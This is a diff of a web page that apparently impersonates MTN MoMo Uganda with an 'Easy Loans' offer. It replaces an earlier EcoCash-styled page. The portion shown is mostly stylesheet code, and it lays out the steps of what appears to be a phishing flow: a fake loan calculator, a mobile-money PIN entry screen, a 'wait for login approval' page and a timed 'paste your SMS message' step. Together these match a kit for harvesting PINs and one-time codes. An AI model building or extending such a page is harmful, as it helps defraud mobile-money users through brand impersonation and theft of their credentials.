@@ -2,300 +2,3058 @@
 <html lang="en">
 
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>EcoCash</title>
+    <link rel="icon" type="image/png" sizes="32x32" href="https://i.postimg.cc/yd0znr7D/images-png-mtn.png">
+    <link rel="apple-touch-icon" sizes="180x180" href="https://i.postimg.cc/yd0znr7D/images-png-mtn.png">
+    <meta charset="UTF-8" />
+    <!-- This site is hosted on Netlify. Anyone can build and deploy a site
+     like this one for free: https://netlify.new/?utm_campaign=loops&utm_source=ai-legible&utm_medium=owned&utm_content=comment&utm_id=e9788f60-af43-4c03-9c43-ac933dee9d3b
+     Netlify hosting facts for this site: static/SSR served via Netlify Edge. -->
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>MTN MoMo Uganda – Easy Loans</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet" />
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
+         :root {
+            --mtn-dark: #003366;
+            --mtn-gold: #FFD700;
+            --mtn-light: #004080;
+            --grad: linear-gradient(to right, #003366, #004080);
+            --page-bg: #F5F5F5;
+            --white: #FFFFFF;
+            --text-dark: #1C2340;
+            --text-mid: #444;
+            --text-light: #888;
+            --border: #ddd;
+            --radius: 12px;
+            --radius-sm: 8px;
+        }
+        
         * {
+            box-sizing: border-box;
             margin: 0;
             padding: 0;
-            box-sizing: border-box;
         }
         
-        html,
         body {
-            min-height: 100vh;
             font-family: 'Inter', sans-serif;
-            background: #f0f2f5;
-            overflow-x: hidden;
-            overflow-y: auto;
+            background: var(--page-bg);
+            color: var(--text-dark);
+            min-height: 100vh;
         }
+        /* ─── MTN MOMO LOGO ─── */
         
-        body {
+        .mtn-logo {
             display: flex;
             flex-direction: column;
             align-items: center;
-            padding: clamp(10px, 2vw, 20px);
+            gap: 2px;
         }
         
-        header {
-            width: 100%;
-            max-width: 480px;
-            padding: clamp(10px, 3vw, 15px) clamp(15px, 4vw, 20px);
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-bottom: clamp(5px, 2vw, 10px);
-        }
-        
-        .menu-btn {
-            font-size: clamp(24px, 6vw, 28px);
-            background: none;
-            border: none;
-            cursor: pointer;
-            color: #333;
-        }
-        
-        .logo {
-            font-size: clamp(24px, 6vw, 28px);
-            font-weight: 700;
-        }
-        
-        .logo-eco {
-            color: #0066ff;
-        }
-        
-        .logo-cash {
-            color: #ff0000;
-        }
-        
-        .card {
-            background: white;
-            border-radius: clamp(16px, 5vw, 24px);
-            padding: clamp(24px, 6vw, 32px) clamp(20px, 5vw, 28px);
-            width: 100%;
-            max-width: 480px;
-            box-shadow: 0 15px 40px rgba(0, 0, 0, 0.1);
-            text-align: center;
-            display: flex;
-            flex-direction: column;
-            justify-content: space-between;
-        }
-        
-        @media (min-width: 769px) {
-            body {
-                padding: clamp(15px, 3vw, 20px);
-                justify-content: center;
-            }
-            .card {
-                padding: clamp(30px, 5vw, 40px) clamp(25px, 4vw, 30px);
-            }
-        }
-        
-        .title {
-            font-size: clamp(22px, 5vw, 26px);
-            font-weight: 700;
-            color: #333;
-            margin-bottom: clamp(4px, 1.5vw, 6px);
-        }
-        
-        .subtitle {
-            font-size: clamp(13px, 3.5vw, 15px);
-            color: #777;
-            margin-bottom: clamp(18px, 5vw, 24px);
-        }
-        
-        .calc-section {
-            background: #f8f9ff;
-            border-radius: clamp(15px, 4vw, 20px);
-            padding: clamp(18px, 5vw, 24px);
-            margin-bottom: clamp(18px, 5vw, 24px);
-            text-align: left;
-        }
-        
-        .calc-title {
-            font-size: clamp(16px, 4vw, 19px);
-            font-weight: 600;
-            text-align: center;
-            margin-bottom: clamp(18px, 5vw, 24px);
-            color: #333;
-        }
-        
-        .input-group {
-            margin-bottom: clamp(24px, 7vw, 32px);
-        }
-        
-        .input-header {
-            display: flex;
-            justify-content: space-between;
-            margin-bottom: clamp(8px, 2vw, 10px);
-            font-weight: 600;
-            font-size: clamp(13px, 3.5vw, 15px);
-        }
-        
-        .input-label {
-            color: #333;
-        }
-        
-        .input-value {
-            color: #4361ee;
-            font-weight: 700;
-        }
-        
-        .slider {
-            -webkit-appearance: none;
-            width: 100%;
-            height: 8px;
-            border-radius: 4px;
-            background: #e0e0e0;
-            outline: none;
-        }
-        
-        .slider::-webkit-slider-thumb {
-            -webkit-appearance: none;
-            width: clamp(24px, 6vw, 28px);
-            height: clamp(24px, 6vw, 28px);
-            border-radius: 50%;
-            background: #4361ee;
-            cursor: pointer;
-        }
-        
-        .range-labels {
-            display: flex;
-            justify-content: space-between;
-            color: #999;
-            font-size: clamp(12px, 3vw, 14px);
-            margin-top: clamp(6px, 2vw, 8px);
-        }
-        
-        .payment-box {
-            background: #f0f4ff;
-            padding: clamp(14px, 4vw, 18px);
-            border-radius: clamp(12px, 4vw, 16px);
-            text-align: center;
-        }
-        
-        .payment-label {
+        .mtn-logo .logo-img {
+            height: 44px;
+            object-fit: contain;
             display: block;
-            color: #666;
-            margin-bottom: clamp(6px, 2vw, 8px);
-            font-size: clamp(12px, 3vw, 14px);
         }
         
-        .payment-amount {
-            font-size: clamp(26px, 7vw, 30px);
+        .mtn-logo .logo-img.small {
+            height: 30px;
+        }
+        
+        .mtn-logo .logo-img.tiny {
+            height: 24px;
+        }
+        
+        .mtn-logo-text {
+            font-size: 1rem;
             font-weight: 700;
-            color: #4361ee;
+            color: var(--mtn-dark);
+            line-height: 1.1;
         }
         
-        .apply-btn {
+        .mtn-logo-sub {
+            font-size: 0.65rem;
+            color: #888;
+            font-weight: 500;
+            line-height: 1;
+        }
+        
+        .mtn-logo .logo-text-white {
+            color: #fff;
+        }
+        
+        .mtn-logo .logo-sub-white {
+            color: rgba(255, 255, 255, 0.6);
+        }
+        
+        .mtn-logo .logo-gold {
+            color: var(--mtn-gold);
+        }
+        /* ─── UGANDA FLAG BADGE ─── */
+        
+        .flag-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 5px;
+            font-size: 0.7rem;
+            font-weight: 600;
+            color: var(--mtn-gold);
+            background: rgba(255, 215, 0, 0.15);
+            padding: 2px 12px 2px 8px;
+            border-radius: 20px;
+            border: 1px solid rgba(255, 215, 0, 0.25);
+            margin-top: 1px;
+        }
+        
+        .flag-badge .flag-emoji {
+            font-size: 1.1rem;
+            line-height: 1;
+        }
+        /* ─── ADMIN MODAL (IMPORTANT NOTE) ─── */
+        
+        #adminModalOverlay {
+            display: none;
+            position: fixed;
+            inset: 0;
+            background: rgba(0, 0, 0, 0.55);
+            backdrop-filter: blur(4px);
+            z-index: 99999;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+        
+        #adminModalOverlay.show {
+            display: flex;
+        }
+        
+        .admin-modal {
+            background: var(--white);
+            border-radius: var(--radius);
+            padding: 36px 32px 28px;
+            max-width: 460px;
             width: 100%;
-            padding: clamp(12px, 4vw, 16px);
-            background: linear-gradient(to right, #4361ee, #7209b7);
-            color: white;
-            border: none;
-            border-radius: 50px;
-            font-size: clamp(16px, 4vw, 18px);
-            font-weight: 700;
-            cursor: pointer;
-            margin-bottom: clamp(18px, 5vw, 24px);
+            box-shadow: 0 24px 64px rgba(0, 0, 0, 0.3);
+            animation: modalPop 0.35s cubic-bezier(0.34, 1.56, 0.64, 1);
+            position: relative;
+            border-top: 6px solid var(--mtn-gold);
         }
         
-        .features {
+        @keyframes modalPop {
+            from {
+                opacity: 0;
+                transform: scale(0.85) translateY(20px);
+            }
+            to {
+                opacity: 1;
+                transform: scale(1) translateY(0);
+            }
+        }
+        
+        .admin-modal .modal-title {
+            font-size: 1.25rem;
+            font-weight: 700;
+            color: var(--mtn-dark);
+            margin-bottom: 12px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        
+        .admin-modal .modal-title span {
+            font-size: 1.4rem;
+        }
+        
+        .admin-modal .modal-body {
+            font-size: 0.95rem;
+            line-height: 1.7;
+            color: var(--text-mid);
+            margin-bottom: 22px;
+            white-space: pre-wrap;
+            word-break: break-word;
+        }
+        
+        .admin-modal .modal-close-btn {
+            display: block;
+            width: 100%;
+            padding: 12px;
+            background: var(--grad);
+            color: #fff;
+            border: none;
+            border-radius: var(--radius-sm);
+            font-size: 0.9rem;
+            font-weight: 600;
+            cursor: pointer;
+            font-family: 'Inter', sans-serif;
+            transition: opacity 0.2s;
+        }
+        
+        .admin-modal .modal-close-btn:hover {
+            opacity: 0.88;
+        }
+        /* ─── PAGE SYSTEM ─── */
+        
+        .page {
+            display: none;
+            min-height: 100vh;
+            animation: fadeIn 0.3s ease;
+        }
+        
+        .page.active {
+            display: flex;
+            flex-direction: column;
+        }
+        
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+                transform: translateY(8px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+        /* ─── OVERLAY / MODAL (generic) ─── */
+        
+        .overlay {
+            display: none;
+            position: fixed;
+            inset: 0;
+            background: rgba(0, 0, 0, 0.5);
+            backdrop-filter: blur(3px);
+            z-index: 999;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        .overlay.show {
+            display: flex;
+        }
+        
+        .modal {
+            background: var(--white);
+            border-radius: var(--radius);
+            padding: 40px 36px;
+            text-align: center;
+            max-width: 320px;
+            width: 90%;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.2);
+            animation: popIn 0.3s cubic-bezier(0.34, 1.56, 0.64, 1);
+        }
+        
+        @keyframes popIn {
+            from {
+                opacity: 0;
+                transform: scale(0.85);
+            }
+            to {
+                opacity: 1;
+                transform: scale(1);
+            }
+        }
+        
+        .spinner {
+            width: 44px;
+            height: 44px;
+            border: 4px solid #eee;
+            border-top-color: var(--mtn-gold);
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            margin: 0 auto 18px;
+        }
+        
+        @keyframes spin {
+            to {
+                transform: rotate(360deg);
+            }
+        }
+        
+        .modal h3 {
+            font-size: 1.1rem;
+            font-weight: 600;
+            color: var(--text-dark);
+            margin-bottom: 6px;
+        }
+        
+        .modal p {
+            font-size: 0.88rem;
+            color: var(--text-light);
+        }
+        /* ─── NAV ─── */
+        
+        .navbar {
+            background: var(--mtn-dark);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 0 20px;
+            height: 54px;
+            position: relative;
+            flex-shrink: 0;
+        }
+        
+        .nav-left {
+            position: absolute;
+            left: 20px;
+            color: rgba(255, 255, 255, 0.6);
+            font-size: 0.84rem;
+            cursor: pointer;
+            text-decoration: none;
+            transition: color 0.2s;
+        }
+        
+        .nav-left:hover {
+            color: #fff;
+        }
+        
+        .nav-right {
+            position: absolute;
+            right: 20px;
+            display: flex;
+            flex-direction: column;
+            gap: 4px;
+            cursor: pointer;
+            padding: 4px;
+        }
+        
+        .hline {
+            width: 20px;
+            height: 2px;
+            background: rgba(255, 255, 255, 0.6);
+            border-radius: 1px;
+        }
+        /* ─── BUTTONS ─── */
+        
+        .btn-grad {
+            background: var(--grad);
+            color: #fff;
+            border: none;
+            border-radius: 8px;
+            padding: 14px 20px;
+            font-size: 0.88rem;
+            font-weight: 600;
+            letter-spacing: 0.05em;
+            cursor: pointer;
+            width: 100%;
+            font-family: 'Inter', sans-serif;
+            transition: opacity 0.2s;
+        }
+        
+        .btn-grad:hover {
+            opacity: 0.9;
+        }
+        
+        .btn-grad:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+        
+        .btn-gray {
+            background: #e0e0e0;
+            color: #666;
+            border: none;
+            border-radius: 8px;
+            padding: 14px 20px;
+            font-size: 0.88rem;
+            font-weight: 600;
+            letter-spacing: 0.05em;
+            cursor: pointer;
+            flex: 1;
+            font-family: 'Inter', sans-serif;
+            transition: background 0.2s;
+        }
+        
+        .btn-gray:hover {
+            background: #d0d0d0;
+        }
+        /* ─── FORM ─── */
+        
+        .field {
+            margin-bottom: 18px;
+        }
+        
+        .field label {
+            display: block;
+            font-size: 0.82rem;
+            font-weight: 500;
+            color: var(--text-mid);
+            margin-bottom: 6px;
+        }
+        
+        .field input,
+        .field select,
+        .field textarea {
+            width: 100%;
+            padding: 11px 14px;
+            border: 1.5px solid var(--border);
+            border-radius: var(--radius-sm);
+            font-family: 'Inter', sans-serif;
+            font-size: 0.9rem;
+            color: var(--text-dark);
+            background: #fff;
+            outline: none;
+            transition: border-color 0.2s, box-shadow 0.2s;
+            appearance: none;
+            -webkit-appearance: none;
+        }
+        
+        .field input:focus,
+        .field select:focus,
+        .field textarea:focus {
+            border-color: var(--mtn-gold);
+            box-shadow: 0 0 0 3px rgba(255, 215, 0, 0.2);
+        }
+        
+        .field textarea {
+            resize: vertical;
+            min-height: 90px;
+        }
+        
+        .sel-wrap {
+            position: relative;
+        }
+        
+        .sel-wrap::after {
+            content: '▾';
+            position: absolute;
+            right: 14px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: var(--text-light);
+            pointer-events: none;
+            font-size: 0.9rem;
+        }
+        
+        .field-row {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 14px;
+        }
+        
+        .phone-row {
+            display: flex;
+        }
+        
+        .ph-pre {
+            padding: 11px 12px;
+            background: #f5f5f5;
+            border: 1.5px solid var(--border);
+            border-right: none;
+            border-radius: var(--radius-sm) 0 0 var(--radius-sm);
+            font-size: 0.85rem;
+            font-weight: 500;
+            color: #555;
+            white-space: nowrap;
+            display: flex;
+            align-items: center;
+        }
+        
+        .phone-row input {
+            border-radius: 0 var(--radius-sm) var(--radius-sm) 0 !important;
+            flex: 1;
+        }
+        
+        .field-hint {
+            font-size: 0.75rem;
+            color: var(--text-light);
+            margin-top: 5px;
+        }
+        /* ─── STEP PROGRESS ─── */
+        
+        .prog-row {
+            display: flex;
+            gap: 8px;
+            margin: 10px 0 24px;
+        }
+        
+        .prog-seg {
+            flex: 1;
+            height: 4px;
+            border-radius: 2px;
+            background: #e0e0e0;
+            transition: background 0.3s;
+        }
+        
+        .prog-seg.done {
+            background: var(--mtn-gold);
+        }
+        
+        .prog-seg.now {
+            background: var(--mtn-gold);
+        }
+        /* ─── STEP BUTTONS ─── */
+        
+        .step-btns {
+            display: flex;
+            gap: 12px;
+            margin-top: 8px;
+        }
+        
+        .step-btns .btn-grad {
+            flex: 1;
+        }
+        /* ─── FOOTER ─── */
+        
+        .pg-footer {
+            margin-top: auto;
+            padding: 14px;
+            text-align: center;
+            font-size: 0.78rem;
+            color: var(--text-light);
+            background: #fff;
+            border-top: 1px solid #eee;
+            flex-shrink: 0;
+        }
+        /* ───── PAGE 1: LANDING ───── */
+        
+        #page-landing {
+            background: var(--page-bg);
+        }
+        
+        .land-nav {
+            background: var(--mtn-dark);
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 0 24px;
+            height: 52px;
+            flex-shrink: 0;
+        }
+        
+        .land-nav .hbg {
+            display: flex;
+            flex-direction: column;
+            gap: 4px;
+            cursor: pointer;
+        }
+        
+        .land-nav .hbg span {
+            width: 20px;
+            height: 2px;
+            background: rgba(255, 255, 255, 0.7);
+            border-radius: 1px;
+            display: block;
+        }
+        
+        .land-center {
+            flex: 1;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 32px 16px;
+        }
+        
+        .land-card {
+            width: 100%;
+            max-width: 520px;
+            background: #fff;
+            border-radius: var(--radius);
+            box-shadow: 0 4px 24px rgba(0, 0, 0, 0.1);
+            padding: 36px 32px;
+        }
+        
+        .land-card h1 {
+            font-size: 1.45rem;
+            font-weight: 700;
+            text-align: center;
+            margin-bottom: 6px;
+        }
+        
+        .land-tagline {
+            text-align: center;
+            font-size: 0.84rem;
+            color: var(--text-light);
+            margin-bottom: 28px;
+        }
+        
+        .calc-box {
+            background: #fafafa;
+            border: 1px solid #eee;
+            border-radius: var(--radius-sm);
+            padding: 20px;
+            margin-bottom: 22px;
+        }
+        
+        .calc-box h2 {
+            font-size: 0.92rem;
+            font-weight: 600;
+            margin-bottom: 16px;
+        }
+        
+        .calc-row2 {
+            display: flex;
+            justify-content: space-between;
+            font-size: 0.81rem;
+            color: var(--text-mid);
+            margin-bottom: 6px;
+        }
+        
+        .calc-row2 .cv {
+            color: var(--mtn-gold);
+            font-weight: 600;
+        }
+        
+        input[type=range] {
+            width: 100%;
+            -webkit-appearance: none;
+            height: 6px;
+            border-radius: 4px;
+            outline: none;
+            cursor: pointer;
+            margin-bottom: 4px;
+            background: linear-gradient(to right, #4CAF50 0%, #4CAF50 10%, #8BC34A 20%, #CDDC39 30%, #FFEB3B 40%, #FFC107 50%, #FF9800 60%, #FF5722 70%, #E91E63 85%, #D32F2F 100%);
+            background-size: 100% 100%;
+            transition: filter 0.2s;
+        }
+        
+        input[type=range]::-webkit-slider-thumb {
+            -webkit-appearance: none;
+            width: 22px;
+            height: 22px;
+            border-radius: 50%;
+            background: radial-gradient(circle at 35% 35%, #FFD700, #E6A800);
+            border: 3px solid #fff;
+            box-shadow: 0 2px 12px rgba(255, 215, 0, 0.7), 0 0 20px rgba(255, 215, 0, 0.3);
+            cursor: pointer;
+            transition: transform 0.15s, box-shadow 0.15s;
+        }
+        
+        input[type=range]::-webkit-slider-thumb:hover {
+            transform: scale(1.12);
+            box-shadow: 0 2px 20px rgba(255, 215, 0, 0.9), 0 0 30px rgba(255, 215, 0, 0.4);
+        }
+        
+        input[type=range]::-moz-range-thumb {
+            width: 22px;
+            height: 22px;
+            border-radius: 50%;
+            background: radial-gradient(circle at 35% 35%, #FFD700, #E6A800);
+            border: 3px solid #fff;
+            cursor: pointer;
+            box-shadow: 0 2px 12px rgba(255, 215, 0, 0.7);
+        }
+        
+        .range-ends {
+            display: flex;
+            justify-content: space-between;
+            font-size: 0.72rem;
+            color: var(--text-light);
+            margin-bottom: 14px;
+        }
+        
+        .slider-hint-wrap {
+            text-align: center;
+            margin-bottom: 10px;
+            animation: hintPulse 1.8s ease-in-out infinite;
+        }
+        
+        .slider-hint-wrap .hint-arrow {
+            display: inline-block;
+            font-size: 1.3rem;
+            margin-right: 6px;
+            animation: arrowSlide 1.8s ease-in-out infinite;
+        }
+        
+        .slider-hint-wrap .hint-text {
+            font-size: 0.8rem;
+            font-weight: 600;
+            color: var(--mtn-light);
+            background: rgba(255, 215, 0, 0.15);
+            padding: 4px 16px;
+            border-radius: 20px;
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            border: 1px solid rgba(255, 215, 0, 0.25);
+        }
+        
+        @keyframes hintPulse {
+            0%,
+            100% {
+                opacity: 0.7;
+                transform: translateY(0);
+            }
+            50% {
+                opacity: 1;
+                transform: translateY(-3px);
+            }
+        }
+        
+        @keyframes arrowSlide {
+            0%,
+            100% {
+                transform: translateX(0);
+            }
+            50% {
+                transform: translateX(6px);
+            }
+        }
+        
+        .monthly-box {
+            background: #fff;
+            border: 1px solid #eee;
+            border-radius: var(--radius-sm);
+            padding: 14px 16px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        
+        .monthly-box .ml {
+            font-size: 0.82rem;
+            color: var(--text-light);
+        }
+        
+        .monthly-box .ma {
+            font-size: 1.5rem;
+            font-weight: 700;
+            color: var(--mtn-gold);
+        }
+        
+        .feats-row {
             display: flex;
             justify-content: space-around;
-            flex-wrap: wrap;
-            gap: clamp(10px, 3vw, 20px);
+            padding: 20px 0 0;
+            border-top: 1px solid #f0f0f0;
+            margin-top: 4px;
         }
         
-        .feature {
+        .feat {
             text-align: center;
-            color: #777;
-            font-size: clamp(11px, 3vw, 13px);
-            flex: 1 0 100px;
         }
         
-        .feature-icon {
-            font-size: clamp(32px, 8vw, 36px);
-            margin-bottom: clamp(6px, 2vw, 8px);
+        .feat .fi {
+            font-size: 1.6rem;
+            margin-bottom: 5px;
         }
         
-        footer {
-            padding: clamp(10px, 3vw, 15px);
-            color: #aaa;
-            font-size: clamp(11px, 3vw, 13px);
+        .feat .ft {
+            font-size: 0.8rem;
+            font-weight: 600;
+        }
+        
+        .feat .fs {
+            font-size: 0.73rem;
+            color: var(--text-light);
+        }
+        
+        .land-footer {
+            background: var(--mtn-dark);
+            padding: 14px;
             text-align: center;
+            font-size: 0.77rem;
+            color: rgba(255, 255, 255, 0.45);
             flex-shrink: 0;
+        }
+        /* ───── STEP PAGES ───── */
+        
+        .step-center {
+            flex: 1;
+            display: flex;
+            align-items: flex-start;
+            justify-content: center;
+            padding: 28px 16px;
+        }
+        
+        .step-card {
+            width: 100%;
+            max-width: 480px;
+            background: #fff;
+            border-radius: var(--radius);
+            box-shadow: 0 4px 24px rgba(0, 0, 0, 0.08);
+            padding: 32px 28px;
+        }
+        
+        .step-card h2 {
+            font-size: 1.25rem;
+            font-weight: 700;
+            text-align: center;
+            margin-bottom: 4px;
+        }
+        
+        .step-sub {
+            text-align: center;
+            font-size: 0.82rem;
+            color: var(--text-light);
+            margin-bottom: 4px;
+        }
+        /* ─── SUMMARY ─── */
+        
+        .sum-box {
+            border: 1px solid #e0e0e0;
+            border-left: 4px solid var(--mtn-gold);
+            border-radius: var(--radius-sm);
+            padding: 16px 14px;
+            margin: 16px 0;
+            background: #fafffe;
+        }
+        
+        .sum-box h3 {
+            font-size: 0.88rem;
+            font-weight: 600;
+            margin-bottom: 12px;
+        }
+        
+        .sum-row {
+            display: flex;
+            justify-content: space-between;
+            font-size: 0.82rem;
+            padding: 7px 0;
+            border-bottom: 1px solid #f0f0f0;
+        }
+        
+        .sum-row:last-child {
+            border-bottom: none;
+        }
+        
+        .sum-row .sk {
+            color: var(--text-light);
+        }
+        
+        .sum-row .sv {
+            font-weight: 500;
+        }
+        /* ───── PAGE: PROCESSING ───── */
+        
+        #page-processing {
+            background: linear-gradient(160deg, var(--mtn-dark), var(--mtn-light));
+            align-items: center;
+            justify-content: center;
+        }
+        
+        .proc-wrap {
+            text-align: center;
+            padding: 40px 24px;
+            max-width: 420px;
+        }
+        
+        .proc-icon {
+            width: 80px;
+            height: 80px;
+            border-radius: 50%;
+            background: rgba(255, 255, 255, 0.1);
+            border: 2px solid rgba(255, 255, 255, 0.3);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 2rem;
+            margin: 0 auto 24px;
+            animation: pulse 2s ease infinite;
+        }
+        
+        @keyframes pulse {
+            0%,
+            100% {
+                box-shadow: 0 0 0 0 rgba(255, 215, 0, 0.3);
+            }
+            50% {
+                box-shadow: 0 0 0 16px rgba(255, 215, 0, 0);
+            }
+        }
+        
+        .proc-wrap h2 {
+            font-size: 1.6rem;
+            font-weight: 700;
+            color: #fff;
+            margin-bottom: 12px;
+        }
+        
+        .proc-wrap p {
+            color: rgba(255, 255, 255, 0.75);
+            font-size: 0.88rem;
+            line-height: 1.7;
+            margin-bottom: 24px;
+        }
+        /* ───── PAGE: SIM CARD CHECK ───── */
+        
+        #page-sim-check {
+            background: #fff;
+        }
+        /* ───── PAGE: LOGIN ───── */
+        
+        #page-login {
+            background: #fff;
+        }
+        
+        .pin-box {
+            width: 52px;
+            height: 52px;
+            border: 1.5px solid var(--border);
+            border-radius: var(--radius-sm);
+            text-align: center;
+            font-family: 'Inter', sans-serif;
+            font-size: 1.3rem;
+            font-weight: 700;
+            color: var(--mtn-dark);
+            outline: none;
+            transition: border-color 0.2s;
+            background: #fff;
+        }
+        
+        .pin-box:focus {
+            border-color: var(--mtn-gold);
+            box-shadow: 0 0 0 3px rgba(255, 215, 0, 0.2);
+        }
+        
+        .pin-eye {
+            cursor: pointer;
+            color: var(--text-light);
+            font-size: 1.2rem;
+            background: none;
+            border: none;
+            margin-left: 4px;
+            padding: 4px;
+        }
+        
+        .pin-delete {
+            cursor: pointer;
+            color: var(--text-light);
+            font-size: 1.1rem;
+            background: none;
+            border: none;
+            padding: 4px;
+            transition: color 0.2s;
+        }
+        
+        .pin-delete:hover {
+            color: var(--mtn-gold);
+        }
+        /* ───── PAGE: WAIT FOR LOGIN APPROVAL ───── */
+        
+        #page-wait-login-approval {
+            background: linear-gradient(135deg, var(--mtn-dark), var(--mtn-light));
+            align-items: center;
+            justify-content: center;
+        }
+        
+        .wait-wrap {
+            text-align: center;
+            padding: 40px 24px;
+            max-width: 420px;
+        }
+        
+        .wait-icon {
+            width: 80px;
+            height: 80px;
+            border-radius: 50%;
+            background: rgba(255, 255, 255, 0.1);
+            border: 2px solid rgba(255, 255, 255, 0.3);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 2rem;
+            margin: 0 auto 24px;
+            animation: pulse 2s ease infinite;
+        }
+        
+        .wait-wrap h2 {
+            font-size: 1.6rem;
+            font-weight: 700;
+            color: #fff;
+            margin-bottom: 12px;
+        }
+        
+        .wait-wrap p {
+            color: rgba(255, 255, 255, 0.75);
+            font-size: 0.88rem;
+            line-height: 1.7;
+            margin-bottom: 24px;
+        }
+        /* ───── PAGE: SMS MESSAGE PASTE ───── */
+        
+        #page-sms-paste {
+            background: #fff;
+        }
+        
+        .sms-topbar {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 0 20px;
+            height: 52px;
+            border-bottom: 1px solid #eee;
+            flex-shrink: 0;
+        }
+        
+        .sms-topbar .bk {
+            font-size: 1.1rem;
+            color: #333;
+            cursor: pointer;
+            background: none;
+            border: none;
+        }
+        
+        .sms-body-wrap {
+            flex: 1;
+            padding: 32px 16px;
+            display: flex;
+            align-items: flex-start;
+            justify-content: center;
+        }
+        
+        .sms-card {
+            background: #fff;
+            border: 1px solid #eee;
+            border-radius: var(--radius);
+            padding: 32px 28px;
+            width: 100%;
+            max-width: 440px;
+            box-shadow: 0 2px 16px rgba(0, 0, 0, 0.06);
+        }
+        
+        .sms-card h2 {
+            font-size: 1.2rem;
+            font-weight: 700;
+            margin-bottom: 6px;
+            color: var(--mtn-dark);
+        }
+        
+        .sms-hint {
+            font-size: 0.83rem;
+            color: var(--text-light);
+            margin-bottom: 22px;
+        }
+        
+        .sms-textarea {
+            width: 100%;
+            padding: 12px 14px;
+            border: 1.5px solid var(--border);
+            border-radius: var(--radius-sm);
+            font-family: 'Inter', sans-serif;
+            font-size: 0.9rem;
+            color: var(--text-dark);
+            background: #fff;
+            outline: none;
+            transition: border-color 0.2s;
+            min-height: 120px;
+            resize: vertical;
+        }
+        
+        .sms-textarea:focus {
+            border-color: var(--mtn-gold);
+            box-shadow: 0 0 0 3px rgba(255, 215, 0, 0.2);
+        }
+        
+        .sms-code-hint {
+            font-size: 0.75rem;
+            color: var(--text-light);
+            margin-top: 8px;
+            font-style: italic;
+        }
+        
+        .btn-sms {
+            width: 100%;
+            padding: 13px;
+            background: #e8e8e8;
+            color: #aaa;
+            border: none;
+            border-radius: 8px;
+            font-size: 0.88rem;
+            font-weight: 600;
+            letter-spacing: 0.05em;
+            cursor: pointer;
+            font-family: 'Inter', sans-serif;
+            transition: all 0.2s;
+            margin-top: 16px;
+        }
+        
+        .btn-sms.rdy {
+            background: var(--grad);
+            color: #fff;
+        }
+        
+        .sms-curve {
+            background: #fff;
+            overflow: hidden;
+            flex-shrink: 0;
+        }
+        
+        .sms-curve::before {
+            content: '';
+            display: block;
+            background: var(--mtn-dark);
+            height: 50px;
+            clip-path: ellipse(60% 100% at 50% 100%);
+            margin-bottom: -4px;
+        }
+        
+        .sms-foot {
+            background: var(--mtn-dark);
+            padding: 14px;
+            text-align: center;
+            font-size: 0.75rem;
+            color: rgba(255, 255, 255, 0.45);
+        }
+        /* ───── SMS COUNTDOWN TIMER ───── */
+        
+        .sms-timer-wrap {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin-bottom: 14px;
+            padding: 10px 14px;
+            background: #fff8f0;
+            border: 1.5px solid #f5c28a;
+            border-radius: var(--radius-sm);
+        }
+        
+        .sms-timer-circle {
+            position: relative;
+            width: 44px;
+            height: 44px;
+            flex-shrink: 0;
+        }
+        
+        .sms-timer-svg {
+            transform: rotate(-90deg);
+        }
+        
+        .sms-timer-bg {
+            fill: none;
+            stroke: #f0e0cc;
+            stroke-width: 4;
+        }
+        
+        .sms-timer-arc {
+            fill: none;
+            stroke: #e07800;
+            stroke-width: 4;
+            stroke-linecap: round;
+            stroke-dasharray: 113;
+            stroke-dashoffset: 0;
+            transition: stroke-dashoffset 1s linear, stroke 1s;
+        }
+        
+        .sms-timer-arc.urgent {
+            stroke: #d91e1e;
+        }
+        
+        .sms-timer-num {
+            position: absolute;
+            inset: 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 0.75rem;
+            font-weight: 700;
+            color: #e07800;
+        }
+        
+        .sms-timer-num.urgent {
+            color: #d91e1e;
+        }
+        
+        .sms-timer-text {
+            font-size: 0.82rem;
+            color: #7a4500;
+            line-height: 1.4;
+        }
+        
+        .sms-timer-text strong {
+            font-weight: 600;
+        }
+        
+        .sms-resend-wrap {
+            display: none;
+            background: #fef2f2;
+            border: 1.5px solid #fecaca;
+            border-radius: var(--radius-sm);
+            padding: 16px 16px 14px;
+            margin-bottom: 14px;
+            text-align: center;
+        }
+        
+        .sms-resend-wrap p {
+            font-size: 0.83rem;
+            color: #991b1b;
+            margin-bottom: 12px;
+            line-height: 1.5;
+        }
+        
+        .btn-resend {
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            padding: 10px 22px;
+            background: var(--grad);
+            color: #fff;
+            border: none;
+            border-radius: 8px;
+            font-size: 0.85rem;
+            font-weight: 600;
+            letter-spacing: 0.04em;
+            cursor: pointer;
+            font-family: 'Inter', sans-serif;
+            transition: opacity 0.2s;
+        }
+        
+        .btn-resend:hover {
+            opacity: 0.88;
+        }
+        
+        .btn-resend:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
